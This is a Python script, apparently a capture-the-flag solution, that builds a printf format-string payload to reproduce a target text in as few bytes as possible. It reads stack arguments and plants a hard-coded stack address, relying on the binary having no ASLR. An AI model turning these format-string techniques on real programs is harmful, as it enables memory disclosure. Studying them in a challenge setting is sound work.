from pwn import p64, flat
from base64 import b64encode
from heapq import heappop, heappush

target = open("../publish/target.txt", "rb").read()

def solve():
    """
    Dijkstra search for a set of moves that produce the target. The state is
    (pos, arg) where pos is the number of bytes written, and arg is the current
    stack argument that a printf directive would read from. We keep track of
    this because we may be able to use it to print characters to save bytes
    (for example if a target character appears where the arg is pointing to on
     the stack). Moves can be either character literals, or printf directives
    which use N to pad with space characters:

    %N.s  prints the string pointed to by the arg and increments arg
    %N.m  prints the string pointed to by the arg without incrementing it
    %N.*s prints the string pointed to by the arg and increments arg by two
    %Nc   prints the character at the arg and increments arg
    %-Nc   prints the character at the arg and increments arg, with padding on the right

    Due to the register layout when printf is called, we just use %N.*s when
    arg==4 to avoid bad pointers. From arg==6 onwards we are in our payload
    string so it becomes predictable.
    """

    queue = [(0, 0, (0, 1), b"")]
    seen = {(0, 1): 0}
    counter = 0

    while queue:
        cost, _, (pos, arg), payload = heappop(queue)

        if pos == len(target):
            return payload

        moves = []

        if target[pos] == ord("%"):
            moves.append((b"%%", 1, 0))
        else:
            moves.append((bytes([target[pos]]), 1, 0))

        if target[pos] == ord(" "):
            spaces = 0
            while pos + spaces < len(target) and target[pos + spaces] == ord(" "):
                spaces += 1
            ns = str(spaces).encode()

            moves.append((b"%" + ns + b".s", spaces, 1))
            moves.append((b"%" + ns + b".m", spaces, 0))

            if arg == 4:
                moves.append((b"%" + ns + b".*s", spaces, 2))

        if arg >= 6:
            offset = 8 * (arg - 6)
            ch = payload[offset] if offset < len(payload) else None

            for w in range(1, 20):
                out = target[pos : pos + w]

                if w == 1 and out[0] == ch:
                    moves.append((b"%c", 1, 1))

                elif w >= 2:
                    ns = str(w).encode()

                    if out[:-1] == b" " * (w - 1) and out[-1] == ch:
                        moves.append((b"%" + ns + b"c", w, 1))

                    if out[0] == ch and out[1:] == b" " * (w - 1):
                        moves.append((b"%-" + ns + b"c", w, 1))

        for tok, advance, arg_incr in moves:
            new_cost = cost + len(tok)
            new_state = (pos + advance, arg + arg_incr)

            if seen.get(new_state, 10**9) <= new_cost:
                continue

            seen[new_state] = new_cost
            counter += 1
            heappush(queue, (new_cost, counter, new_state, payload + tok))

start_addr = 0x7FFFFFFFDCB0
TRICK_PLACEHOLDER = b"XXXXX"
target = target.replace(b"*" * 11, TRICK_PLACEHOLDER)

"""
There are a few runs of 11 *'s which we can compress into %n$s by placing a
single run at the end of our payload, as well as a stack address pointing to
the run (since there is no ASLR).
"""

payload = solve()
assert payload
F = len(payload)
z = 8 * ((len(payload) + 11 + 8) // 8) - (len(payload) + 11)
assert (len(payload) + 11 + z) % 8 == 0
n = (len(payload) + 11 + z) // 8 + 6

sol = flat(
    [
        payload.replace(TRICK_PLACEHOLDER, f"%{n}$s".encode()),
        b"\x00",
        b"*" * 11,
        b"\x00" * (z - 1),
        p64(start_addr + len(payload) + 1)[:-2],
    ]
)

print(sol.decode('latin1'))
print()
print(b64encode(sol).decode())
print("size:", len(sol))
